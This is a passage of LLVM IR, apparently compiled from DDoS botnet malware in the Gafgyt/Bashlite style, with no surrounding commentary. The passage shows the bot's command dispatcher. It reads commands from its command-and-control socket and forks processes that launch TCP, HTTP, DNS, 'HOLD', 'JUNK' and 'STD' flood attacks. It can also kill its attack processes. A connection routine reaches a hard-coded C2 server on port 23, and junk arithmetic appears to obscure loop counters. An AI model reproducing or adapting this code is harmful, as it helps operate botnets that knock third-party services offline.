  %472 = load i32, i32* %20, align 4
  %473 = load i32, i32* %21, align 4
  %474 = load i32, i32* %22, align 4
  %475 = load i8*, i8** %23, align 8
  %476 = load i32, i32* %25, align 4
  %477 = load i32, i32* %24, align 4
  call void @sendTCP(i8* %471, i32 %472, i32 %473, i32 %474, i8* %475, i32 %476, i32 %477)
  call void @_exit(i32 0) #12
  unreachable

; <label>:478:                                    ; preds = %467
  %479 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %479, i8** %26, align 8
  br label %464

; <label>:480:                                    ; preds = %464
  br label %493

; <label>:481:                                    ; preds = %456
  %482 = call i32 @listFork()
  %483 = icmp ne i32 %482, 0
  br i1 %483, label %492, label %484

; <label>:484:                                    ; preds = %481
  %485 = load i8*, i8** %19, align 8
  %486 = load i32, i32* %20, align 4
  %487 = load i32, i32* %21, align 4
  %488 = load i32, i32* %22, align 4
  %489 = load i8*, i8** %23, align 8
  %490 = load i32, i32* %25, align 4
  %491 = load i32, i32* %24, align 4
  call void @sendTCP(i8* %485, i32 %486, i32 %487, i32 %488, i8* %489, i32 %490, i32 %491)
  call void @_exit(i32 0) #12
  unreachable

; <label>:492:                                    ; preds = %481
  br label %493

; <label>:493:                                    ; preds = %492, %480
  br label %494

; <label>:494:                                    ; preds = %493, %365
  %495 = load i8**, i8*** %4, align 8
  %496 = getelementptr inbounds i8*, i8** %495, i64 0
  %497 = load i8*, i8** %496, align 8
  %498 = call i32 @strcmp(i8* %497, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.459, i32 0, i32 0)) #10
  %499 = icmp ne i32 %498, 0
  br i1 %499, label %577, label %500

; <label>:500:                                    ; preds = %494
  %501 = load i32, i32* %3, align 4
  %502 = icmp slt i32 %501, 6
  br i1 %502, label %503, label %506

; <label>:503:                                    ; preds = %500
  %504 = load i32, i32* @mainCommSock, align 4
  %505 = call i32 (i32, i8*, ...) @sockprintf(i32 %504, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.460, i32 0, i32 0))
  br label %933

; <label>:506:                                    ; preds = %500
  %507 = load i8**, i8*** %4, align 8
  %508 = getelementptr inbounds i8*, i8** %507, i64 1
  %509 = load i8*, i8** %508, align 8
  %510 = call i8* @strstr(i8* %509, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %511 = icmp ne i8* %510, null
  br i1 %511, label %512, label %549

; <label>:512:                                    ; preds = %506
  %513 = load i8**, i8*** %4, align 8
  %514 = getelementptr inbounds i8*, i8** %513, i64 1
  %515 = load i8*, i8** %514, align 8
  %516 = call i8* @strtok(i8* %515, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %516, i8** %27, align 8
  br label %517

; <label>:517:                                    ; preds = %546, %512
  %518 = load i8*, i8** %27, align 8
  %519 = icmp ne i8* %518, null
  br i1 %519, label %520, label %548

; <label>:520:                                    ; preds = %517
  %521 = call i32 @listFork()
  %522 = icmp ne i32 %521, 0
  br i1 %522, label %546, label %523

; <label>:523:                                    ; preds = %520
  %524 = load i8**, i8*** %4, align 8
  %525 = getelementptr inbounds i8*, i8** %524, i64 1
  %526 = load i8*, i8** %525, align 8
  %527 = load i8**, i8*** %4, align 8
  %528 = getelementptr inbounds i8*, i8** %527, i64 2
  %529 = load i8*, i8** %528, align 8
  %530 = load i8**, i8*** %4, align 8
  %531 = getelementptr inbounds i8*, i8** %530, i64 3
  %532 = load i8*, i8** %531, align 8
  %533 = call i32 @atoi(i8* %532) #10
  %534 = trunc i32 %533 to i16
  %535 = load i8**, i8*** %4, align 8
  %536 = getelementptr inbounds i8*, i8** %535, i64 4
  %537 = load i8*, i8** %536, align 8
  %538 = load i8**, i8*** %4, align 8
  %539 = getelementptr inbounds i8*, i8** %538, i64 5
  %540 = load i8*, i8** %539, align 8
  %541 = call i32 @atoi(i8* %540) #10
  %542 = load i8**, i8*** %4, align 8
  %543 = getelementptr inbounds i8*, i8** %542, i64 6
  %544 = load i8*, i8** %543, align 8
  %545 = call i32 @atoi(i8* %544) #10
  call void @sendHTTP(i8* %526, i8* %529, i16 zeroext %534, i8* %537, i32 %541, i32 %545)
  call void @_exit(i32 0) #12
  unreachable

; <label>:546:                                    ; preds = %520
  %547 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %547, i8** %27, align 8
  br label %517

; <label>:548:                                    ; preds = %517
  br label %576

; <label>:549:                                    ; preds = %506
  %550 = call i32 @listFork()
  %551 = icmp ne i32 %550, 0
  br i1 %551, label %552, label %553

; <label>:552:                                    ; preds = %549
  br label %933

; <label>:553:                                    ; preds = %549
  %554 = load i8**, i8*** %4, align 8
  %555 = getelementptr inbounds i8*, i8** %554, i64 1
  %556 = load i8*, i8** %555, align 8
  %557 = load i8**, i8*** %4, align 8
  %558 = getelementptr inbounds i8*, i8** %557, i64 2
  %559 = load i8*, i8** %558, align 8
  %560 = load i8**, i8*** %4, align 8
  %561 = getelementptr inbounds i8*, i8** %560, i64 3
  %562 = load i8*, i8** %561, align 8
  %563 = call i32 @atoi(i8* %562) #10
  %564 = trunc i32 %563 to i16
  %565 = load i8**, i8*** %4, align 8
  %566 = getelementptr inbounds i8*, i8** %565, i64 4
  %567 = load i8*, i8** %566, align 8
  %568 = load i8**, i8*** %4, align 8
  %569 = getelementptr inbounds i8*, i8** %568, i64 5
  %570 = load i8*, i8** %569, align 8
  %571 = call i32 @atoi(i8* %570) #10
  %572 = load i8**, i8*** %4, align 8
  %573 = getelementptr inbounds i8*, i8** %572, i64 6
  %574 = load i8*, i8** %573, align 8
  %575 = call i32 @atoi(i8* %574) #10
  call void @sendHTTP(i8* %556, i8* %559, i16 zeroext %564, i8* %567, i32 %571, i32 %575)
  call void @_exit(i32 0) #12
  unreachable

; <label>:576:                                    ; preds = %548
  br label %577

; <label>:577:                                    ; preds = %576, %494
  %578 = load i8**, i8*** %4, align 8
  %579 = getelementptr inbounds i8*, i8** %578, i64 0
  %580 = load i8*, i8** %579, align 8
  %581 = call i32 @strcmp(i8* %580, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.461, i32 0, i32 0)) #10
  %582 = icmp ne i32 %581, 0
  br i1 %582, label %682, label %583

; <label>:583:                                    ; preds = %577
  %584 = call i32 @socket(i32 2, i32 3, i32 255) #2
  store i32 %584, i32* %28, align 4
  %585 = icmp slt i32 %584, 0
  br i1 %585, label %586, label %587

; <label>:586:                                    ; preds = %583
  call void @exit(i32 1) #14
  unreachable

; <label>:587:                                    ; preds = %583
  %588 = load i32, i32* %3, align 4
  %589 = icmp slt i32 %588, 6
  br i1 %589, label %590, label %593

; <label>:590:                                    ; preds = %587
  %591 = load i32, i32* @mainCommSock, align 4
  %592 = call i32 (i32, i8*, ...) @sockprintf(i32 %591, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.462, i32 0, i32 0))
  call void @exit(i32 0) #14
  unreachable

; <label>:593:                                    ; preds = %587
  %594 = call i32 @listFork()
  %595 = icmp ne i32 %594, 0
  br i1 %595, label %681, label %596

; <label>:596:                                    ; preds = %593
  %597 = call i64 @time(i64* null) #2
  %598 = trunc i64 %597 to i32
  call void @srand(i32 %598) #2
  %599 = load i8**, i8*** %4, align 8
  %600 = getelementptr inbounds i8*, i8** %599, i64 4
  %601 = load i8*, i8** %600, align 8
  %602 = call i32 @atoi(i8* %601) #10
  store i32 %602, i32* %29, align 4
  %603 = load i8**, i8*** %4, align 8
  %604 = getelementptr inbounds i8*, i8** %603, i64 5
  %605 = load i8*, i8** %604, align 8
  %606 = call i32 @atoi(i8* %605) #10
  store i32 %606, i32* %30, align 4
  store i32 0, i32* %32, align 4
  %607 = load i8**, i8*** %4, align 8
  %608 = getelementptr inbounds i8*, i8** %607, i64 3
  %609 = load i8*, i8** %608, align 8
  %610 = call i32 @download(i8* %609, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.418, i32 0, i32 0))
  %611 = load i32, i32* @mainCommSock, align 4
  %612 = load i8**, i8*** %4, align 8
  %613 = getelementptr inbounds i8*, i8** %612, i64 1
  %614 = load i8*, i8** %613, align 8
  %615 = load i8**, i8*** %4, align 8
  %616 = getelementptr inbounds i8*, i8** %615, i64 2
  %617 = load i8*, i8** %616, align 8
  %618 = load i8**, i8*** %4, align 8
  %619 = getelementptr inbounds i8*, i8** %618, i64 6
  %620 = load i8*, i8** %619, align 8
  %621 = call i32 @atoi(i8* %620) #10
  %622 = load i8**, i8*** %4, align 8
  %623 = getelementptr inbounds i8*, i8** %622, i64 5
  %624 = load i8*, i8** %623, align 8
  %625 = call i32 @atoi(i8* %624) #10
  %626 = call i32 (i32, i8*, ...) @sockprintf(i32 %611, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.463, i32 0, i32 0), i8* %614, i8* %617, i32 %621, i32 %625)
  %627 = load i32, i32* %29, align 4
  %628 = zext i32 %627 to i64
  %629 = call i8* @llvm.stacksave()
  store i8* %629, i8** %33, align 8
  %630 = alloca %struct.thread_data, i64 %628, align 16
  store i32 0, i32* %31, align 4
  br label %631

; <label>:631:                                    ; preds = %673, %596
  %632 = load i32, i32* %31, align 4
  %633 = load i32, i32* %29, align 4
  %634 = icmp slt i32 %632, %633
  br i1 %634, label %635, label %679

; <label>:635:                                    ; preds = %631
  %636 = load i32, i32* %31, align 4
  %637 = load i32, i32* %31, align 4
  %638 = sext i32 %637 to i64
  %639 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %630, i64 %638
  %640 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %639, i32 0, i32 0
  store i32 %636, i32* %640, align 16
  %641 = load i8**, i8*** %4, align 8
  %642 = getelementptr inbounds i8*, i8** %641, i64 1
  %643 = load i8*, i8** %642, align 8
  %644 = load i32, i32* %31, align 4
  %645 = sext i32 %644 to i64
  %646 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %630, i64 %645
  %647 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %646, i32 0, i32 1
  store i8* %643, i8** %647, align 8
  %648 = load i8**, i8*** %4, align 8
  %649 = getelementptr inbounds i8*, i8** %648, i64 2
  %650 = load i8*, i8** %649, align 8
  %651 = call i32 @atoi(i8* %650) #10
  %652 = load i32, i32* %31, align 4
  %653 = sext i32 %652 to i64
  %654 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %630, i64 %653
  %655 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %654, i32 0, i32 2
  store i32 %651, i32* %655, align 16
  %656 = load i32, i32* %32, align 4
  %657 = load i32, i32* %31, align 4
  %658 = sext i32 %657 to i64
  %659 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %630, i64 %658
  %660 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %659, i32 0, i32 3
  store i32 %656, i32* %660, align 4
  %661 = load i8**, i8*** %4, align 8
  %662 = getelementptr inbounds i8*, i8** %661, i64 6
  %663 = load i8*, i8** %662, align 8
  %664 = call i32 @atoi(i8* %663) #10
  %665 = load i32, i32* %31, align 4
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %630, i64 %666
  %668 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %667, i32 0, i32 4
  store i32 %664, i32* %668, align 8
  %669 = load i32, i32* %31, align 4
  %670 = sext i32 %669 to i64
  %671 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %630, i64 %670
  %672 = bitcast %struct.thread_data* %671 to i8*
  call void @dnsflood(i8* %672)
  br label %673

; <label>:673:                                    ; preds = %635
  %674 = load i32, i32* %31, align 4
  %675 = add i32 %674, -1812406430
  %676 = add i32 %675, 1
  %677 = sub i32 %676, -1812406430
  %678 = add nsw i32 %674, 1
  store i32 %677, i32* %31, align 4
  br label %631

; <label>:679:                                    ; preds = %631
  %680 = load i8*, i8** %33, align 8
  call void @llvm.stackrestore(i8* %680)
  br label %681

; <label>:681:                                    ; preds = %679, %593
  br label %682

; <label>:682:                                    ; preds = %681, %577
  %683 = load i8**, i8*** %4, align 8
  %684 = getelementptr inbounds i8*, i8** %683, i64 0
  %685 = load i8*, i8** %684, align 8
  %686 = call i32 @strcmp(i8* %685, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.464, i32 0, i32 0)) #10
  %687 = icmp ne i32 %686, 0
  br i1 %687, label %748, label %688

; <label>:688:                                    ; preds = %682
  %689 = load i32, i32* %3, align 4
  %690 = icmp slt i32 %689, 4
  br i1 %690, label %703, label %691

; <label>:691:                                    ; preds = %688
  %692 = load i8**, i8*** %4, align 8
  %693 = getelementptr inbounds i8*, i8** %692, i64 2
  %694 = load i8*, i8** %693, align 8
  %695 = call i32 @atoi(i8* %694) #10
  %696 = icmp slt i32 %695, 1
  br i1 %696, label %703, label %697

; <label>:697:                                    ; preds = %691
  %698 = load i8**, i8*** %4, align 8
  %699 = getelementptr inbounds i8*, i8** %698, i64 3
  %700 = load i8*, i8** %699, align 8
  %701 = call i32 @atoi(i8* %700) #10
  %702 = icmp slt i32 %701, 1
  br i1 %702, label %703, label %706

; <label>:703:                                    ; preds = %697, %691, %688
  %704 = load i32, i32* @mainCommSock, align 4
  %705 = call i32 (i32, i8*, ...) @sockprintf(i32 %704, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.465, i32 0, i32 0))
  br label %933

; <label>:706:                                    ; preds = %697
  %707 = load i8**, i8*** %4, align 8
  %708 = getelementptr inbounds i8*, i8** %707, i64 1
  %709 = load i8*, i8** %708, align 8
  store i8* %709, i8** %34, align 8
  %710 = load i8**, i8*** %4, align 8
  %711 = getelementptr inbounds i8*, i8** %710, i64 2
  %712 = load i8*, i8** %711, align 8
  %713 = call i32 @atoi(i8* %712) #10
  store i32 %713, i32* %35, align 4
  %714 = load i8**, i8*** %4, align 8
  %715 = getelementptr inbounds i8*, i8** %714, i64 3
  %716 = load i8*, i8** %715, align 8
  %717 = call i32 @atoi(i8* %716) #10
  store i32 %717, i32* %36, align 4
  %718 = load i8*, i8** %34, align 8
  %719 = call i8* @strstr(i8* %718, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %720 = icmp ne i8* %719, null
  br i1 %720, label %721, label %739

; <label>:721:                                    ; preds = %706
  %722 = load i8*, i8** %34, align 8
  %723 = call i8* @strtok(i8* %722, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %723, i8** %37, align 8
  br label %724

; <label>:724:                                    ; preds = %736, %721
  %725 = load i8*, i8** %37, align 8
  %726 = icmp ne i8* %725, null
  br i1 %726, label %727, label %738

; <label>:727:                                    ; preds = %724
  %728 = call i32 @listFork()
  %729 = icmp ne i32 %728, 0
  br i1 %729, label %736, label %730

; <label>:730:                                    ; preds = %727
  %731 = load i8*, i8** %37, align 8
  %732 = load i32, i32* %35, align 4
  %733 = load i32, i32* %36, align 4
  call void @sendHOLD(i8* %731, i32 %732, i32 %733)
  %734 = load i32, i32* @mainCommSock, align 4
  %735 = call i32 @close(i32 %734)
  call void @_exit(i32 0) #12
  unreachable

; <label>:736:                                    ; preds = %727
  %737 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %737, i8** %37, align 8
  br label %724

; <label>:738:                                    ; preds = %724
  br label %747

; <label>:739:                                    ; preds = %706
  %740 = call i32 @listFork()
  %741 = icmp ne i32 %740, 0
  br i1 %741, label %742, label %743

; <label>:742:                                    ; preds = %739
  br label %933

; <label>:743:                                    ; preds = %739
  %744 = load i8*, i8** %34, align 8
  %745 = load i32, i32* %35, align 4
  %746 = load i32, i32* %36, align 4
  call void @sendHOLD(i8* %744, i32 %745, i32 %746)
  call void @_exit(i32 0) #12
  unreachable

; <label>:747:                                    ; preds = %738
  br label %748

; <label>:748:                                    ; preds = %747, %682
  %749 = load i8**, i8*** %4, align 8
  %750 = getelementptr inbounds i8*, i8** %749, i64 0
  %751 = load i8*, i8** %750, align 8
  %752 = call i32 @strcmp(i8* %751, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.466, i32 0, i32 0)) #10
  %753 = icmp ne i32 %752, 0
  br i1 %753, label %808, label %754

; <label>:754:                                    ; preds = %748
  %755 = load i32, i32* %3, align 4
  %756 = icmp slt i32 %755, 3
  br i1 %756, label %763, label %757

; <label>:757:                                    ; preds = %754
  %758 = load i8**, i8*** %4, align 8
  %759 = getelementptr inbounds i8*, i8** %758, i64 3
  %760 = load i8*, i8** %759, align 8
  %761 = call i32 @atoi(i8* %760) #10
  %762 = icmp slt i32 %761, 0
  br i1 %762, label %763, label %766

; <label>:763:                                    ; preds = %757, %754
  %764 = load i32, i32* @mainCommSock, align 4
  %765 = call i32 (i32, i8*, ...) @sockprintf(i32 %764, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.467, i32 0, i32 0))
  br label %933

; <label>:766:                                    ; preds = %757
  %767 = load i8**, i8*** %4, align 8
  %768 = getelementptr inbounds i8*, i8** %767, i64 1
  %769 = load i8*, i8** %768, align 8
  store i8* %769, i8** %38, align 8
  %770 = load i8**, i8*** %4, align 8
  %771 = getelementptr inbounds i8*, i8** %770, i64 2
  %772 = load i8*, i8** %771, align 8
  %773 = call i32 @atoi(i8* %772) #10
  store i32 %773, i32* %39, align 4
  %774 = load i8**, i8*** %4, align 8
  %775 = getelementptr inbounds i8*, i8** %774, i64 3
  %776 = load i8*, i8** %775, align 8
  %777 = call i32 @atoi(i8* %776) #10
  store i32 %777, i32* %40, align 4
  %778 = load i8*, i8** %38, align 8
  %779 = call i8* @strstr(i8* %778, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %780 = icmp ne i8* %779, null
  br i1 %780, label %781, label %799

; <label>:781:                                    ; preds = %766
  %782 = load i8*, i8** %38, align 8
  %783 = call i8* @strtok(i8* %782, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %783, i8** %41, align 8
  br label %784

; <label>:784:                                    ; preds = %796, %781
  %785 = load i8*, i8** %41, align 8
  %786 = icmp ne i8* %785, null
  br i1 %786, label %787, label %798

; <label>:787:                                    ; preds = %784
  %788 = call i32 @listFork()
  %789 = icmp ne i32 %788, 0
  br i1 %789, label %796, label %790

; <label>:790:                                    ; preds = %787
  %791 = load i8*, i8** %41, align 8
  %792 = load i32, i32* %39, align 4
  %793 = load i32, i32* %40, align 4
  call void @sendJUNK(i8* %791, i32 %792, i32 %793)
  %794 = load i32, i32* @mainCommSock, align 4
  %795 = call i32 @close(i32 %794)
  call void @_exit(i32 0) #12
  unreachable

; <label>:796:                                    ; preds = %787
  %797 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %797, i8** %41, align 8
  br label %784

; <label>:798:                                    ; preds = %784
  br label %807

; <label>:799:                                    ; preds = %766
  %800 = call i32 @listFork()
  %801 = icmp ne i32 %800, 0
  br i1 %801, label %802, label %803

; <label>:802:                                    ; preds = %799
  br label %933

; <label>:803:                                    ; preds = %799
  %804 = load i8*, i8** %38, align 8
  %805 = load i32, i32* %39, align 4
  %806 = load i32, i32* %40, align 4
  call void @sendJUNK(i8* %804, i32 %805, i32 %806)
  call void @_exit(i32 0) #12
  unreachable

; <label>:807:                                    ; preds = %798
  br label %808

; <label>:808:                                    ; preds = %807, %748
  %809 = load i8**, i8*** %4, align 8
  %810 = getelementptr inbounds i8*, i8** %809, i64 0
  %811 = load i8*, i8** %810, align 8
  %812 = call i32 @strcmp(i8* %811, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.468, i32 0, i32 0)) #10
  %813 = icmp ne i32 %812, 0
  br i1 %813, label %872, label %814

; <label>:814:                                    ; preds = %808
  %815 = load i32, i32* %3, align 4
  %816 = icmp slt i32 %815, 4
  br i1 %816, label %829, label %817

; <label>:817:                                    ; preds = %814
  %818 = load i8**, i8*** %4, align 8
  %819 = getelementptr inbounds i8*, i8** %818, i64 2
  %820 = load i8*, i8** %819, align 8
  %821 = call i32 @atoi(i8* %820) #10
  %822 = icmp slt i32 %821, 1
  br i1 %822, label %829, label %823

; <label>:823:                                    ; preds = %817
  %824 = load i8**, i8*** %4, align 8
  %825 = getelementptr inbounds i8*, i8** %824, i64 3
  %826 = load i8*, i8** %825, align 8
  %827 = call i32 @atoi(i8* %826) #10
  %828 = icmp slt i32 %827, 1
  br i1 %828, label %829, label %832

; <label>:829:                                    ; preds = %823, %817, %814
  %830 = load i32, i32* @mainCommSock, align 4
  %831 = call i32 (i32, i8*, ...) @sockprintf(i32 %830, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.469, i32 0, i32 0))
  br label %933

; <label>:832:                                    ; preds = %823
  %833 = load i8**, i8*** %4, align 8
  %834 = getelementptr inbounds i8*, i8** %833, i64 1
  %835 = load i8*, i8** %834, align 8
  store i8* %835, i8** %42, align 8
  %836 = load i8**, i8*** %4, align 8
  %837 = getelementptr inbounds i8*, i8** %836, i64 2
  %838 = load i8*, i8** %837, align 8
  %839 = call i32 @atoi(i8* %838) #10
  store i32 %839, i32* %43, align 4
  %840 = load i8**, i8*** %4, align 8
  %841 = getelementptr inbounds i8*, i8** %840, i64 3
  %842 = load i8*, i8** %841, align 8
  %843 = call i32 @atoi(i8* %842) #10
  store i32 %843, i32* %44, align 4
  %844 = load i8*, i8** %42, align 8
  %845 = call i8* @strstr(i8* %844, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %846 = icmp ne i8* %845, null
  br i1 %846, label %847, label %863

; <label>:847:                                    ; preds = %832
  %848 = load i8*, i8** %42, align 8
  %849 = call i8* @strtok(i8* %848, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %849, i8** %45, align 8
  br label %850

; <label>:850:                                    ; preds = %860, %847
  %851 = load i8*, i8** %45, align 8
  %852 = icmp ne i8* %851, null
  br i1 %852, label %853, label %862

; <label>:853:                                    ; preds = %850
  %854 = call i32 @listFork()
  %855 = icmp ne i32 %854, 0
  br i1 %855, label %860, label %856

; <label>:856:                                    ; preds = %853
  %857 = load i8*, i8** %45, align 8
  %858 = load i32, i32* %43, align 4
  %859 = load i32, i32* %44, align 4
  call void @sendSTD(i8* %857, i32 %858, i32 %859)
  call void @_exit(i32 0) #12
  unreachable

; <label>:860:                                    ; preds = %853
  %861 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %861, i8** %45, align 8
  br label %850

; <label>:862:                                    ; preds = %850
  br label %871

; <label>:863:                                    ; preds = %832
  %864 = call i32 @listFork()
  %865 = icmp ne i32 %864, 0
  br i1 %865, label %866, label %867

; <label>:866:                                    ; preds = %863
  br label %933

; <label>:867:                                    ; preds = %863
  %868 = load i8*, i8** %42, align 8
  %869 = load i32, i32* %43, align 4
  %870 = load i32, i32* %44, align 4
  call void @sendSTD(i8* %868, i32 %869, i32 %870)
  call void @_exit(i32 0) #12
  unreachable

; <label>:871:                                    ; preds = %862
  br label %872

; <label>:872:                                    ; preds = %871, %808
  %873 = load i8**, i8*** %4, align 8
  %874 = getelementptr inbounds i8*, i8** %873, i64 0
  %875 = load i8*, i8** %874, align 8
  %876 = call i32 @strcmp(i8* %875, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.470, i32 0, i32 0)) #10
  %877 = icmp ne i32 %876, 0
  br i1 %877, label %926, label %878

; <label>:878:                                    ; preds = %872
  store i32 0, i32* %46, align 4
  store i64 0, i64* %47, align 8
  br label %879

; <label>:879:                                    ; preds = %909, %878
  %880 = load i64, i64* %47, align 8
  %881 = load i32, i32* @numpids, align 4
  %882 = sext i32 %881 to i64
  %883 = icmp ult i64 %880, %882
  br i1 %883, label %884, label %915

; <label>:884:                                    ; preds = %879
  %885 = load i32*, i32** @pids, align 8
  %886 = load i64, i64* %47, align 8
  %887 = getelementptr inbounds i32, i32* %885, i64 %886
  %888 = load i32, i32* %887, align 4
  %889 = icmp ne i32 %888, 0
  br i1 %889, label %890, label %908

; <label>:890:                                    ; preds = %884
  %891 = load i32*, i32** @pids, align 8
  %892 = load i64, i64* %47, align 8
  %893 = getelementptr inbounds i32, i32* %891, i64 %892
  %894 = load i32, i32* %893, align 4
  %895 = call i32 @getpid() #2
  %896 = icmp ne i32 %894, %895
  br i1 %896, label %897, label %908

; <label>:897:                                    ; preds = %890
  %898 = load i32*, i32** @pids, align 8
  %899 = load i64, i64* %47, align 8
  %900 = getelementptr inbounds i32, i32* %898, i64 %899
  %901 = load i32, i32* %900, align 4
  %902 = call i32 @kill(i32 %901, i32 9) #2
  %903 = load i32, i32* %46, align 4
  %904 = sub i32 %903, 1972610055
  %905 = add i32 %904, 1
  %906 = add i32 %905, 1972610055
  %907 = add nsw i32 %903, 1
  store i32 %906, i32* %46, align 4
  br label %908

; <label>:908:                                    ; preds = %897, %890, %884
  br label %909

; <label>:909:                                    ; preds = %908
  %910 = load i64, i64* %47, align 8
  %911 = sub i64 %910, -5387410484076497030
  %912 = add i64 %911, 1
  %913 = add i64 %912, -5387410484076497030
  %914 = add i64 %910, 1
  store i64 %913, i64* %47, align 8
  br label %879

; <label>:915:                                    ; preds = %879
  %916 = load i32, i32* %46, align 4
  %917 = icmp sgt i32 %916, 0
  br i1 %917, label %918, label %922

; <label>:918:                                    ; preds = %915
  %919 = load i32, i32* @mainCommSock, align 4
  %920 = load i32, i32* %46, align 4
  %921 = call i32 (i32, i8*, ...) @sockprintf(i32 %919, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.471, i32 0, i32 0), i32 %920)
  br label %925

; <label>:922:                                    ; preds = %915
  %923 = load i32, i32* @mainCommSock, align 4
  %924 = call i32 (i32, i8*, ...) @sockprintf(i32 %923, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.472, i32 0, i32 0))
  br label %925

; <label>:925:                                    ; preds = %922, %918
  br label %926

; <label>:926:                                    ; preds = %925, %872
  %927 = load i8**, i8*** %4, align 8
  %928 = getelementptr inbounds i8*, i8** %927, i64 0
  %929 = load i8*, i8** %928, align 8
  %930 = call i32 @strcmp(i8* %929, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.473, i32 0, i32 0)) #10
  %931 = icmp ne i32 %930, 0
  br i1 %931, label %933, label %932

; <label>:932:                                    ; preds = %926
  call void @exit(i32 0) #14
  unreachable

; <label>:933:                                    ; preds = %926, %866, %829, %802, %763, %742, %703, %552, %503, %416, %364, %274, %209, %165, %160, %152, %137, %119, %109, %100
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind
declare i64 @sysconf(i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add i32 %11, -1087624866
  %13 = add i32 %12, 1
  %14 = sub i32 %13, -1087624866
  %15 = add nsw i32 %11, 1
  %16 = sext i32 %14 to i64
  %17 = icmp eq i64 %16, 1
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %26

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* @currentServer, align 4
  %21 = sub i32 0, %20
  %22 = sub i32 0, 1
  %23 = add i32 %21, %22
  %24 = sub i32 0, %23
  %25 = add nsw i32 %20, 1
  store i32 %24, i32* @currentServer, align 4
  br label %26

; <label>:26:                                     ; preds = %19, %18
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %28 = load i32, i32* @currentServer, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [1 x i8*], [1 x i8*]* @cncServer, i64 0, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i8* @strcpy(i8* %27, i8* %31) #2
  store i32 23, i32* %3, align 4
  %33 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %34 = call i8* @strchr(i8* %33, i32 58) #10
  %35 = icmp ne i8* %34, null
  br i1 %35, label %36, label %43

; <label>:36:                                     ; preds = %26
  %37 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %38 = call i8* @strchr(i8* %37, i32 58) #10
  %39 = getelementptr inbounds i8, i8* %38, i64 1
  %40 = call i32 @atoi(i8* %39) #10
  store i32 %40, i32* %3, align 4
  %41 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %42 = call i8* @strchr(i8* %41, i32 58) #10
  store i8 0, i8* %42, align 1
  br label %43

; <label>:43:                                     ; preds = %36, %26
  %44 = call i32 @socket(i32 2, i32 1, i32 0) #2
